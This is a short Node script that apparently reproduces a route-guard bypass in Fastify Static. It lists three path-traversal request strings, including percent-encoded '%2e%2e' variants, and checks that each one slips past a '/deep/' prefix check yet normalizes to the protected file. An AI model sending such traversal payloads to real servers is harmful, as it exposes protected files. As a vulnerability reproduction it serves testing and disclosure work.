import { posix } from "node:path";

const protectedFile = "/deep/secret.txt";
const directRequest = "/deep/secret.txt";
const bypasses = [
  "/foo/../deep/secret.txt",
  "/foo/%2e%2e/deep/secret.txt",
  "/foo/%2E%2E/deep/secret.txt",
];

if (!directRequest.startsWith("/deep/")) {
  throw new Error("the canonical protected route was not denied");
}
for (const requestPath of bypasses) {
  if (requestPath.startsWith("/deep/")) {
    throw new Error("the bypass unexpectedly matched the protected route");
  }
  const servedPath = posix.normalize(decodeURI(requestPath));
  if (servedPath !== protectedFile) {
    throw new Error(
      "the static normalization did not reach the protected file",
    );
  }
}

console.log("vulnerable Fastify Static route-guard disclosure reproduced");
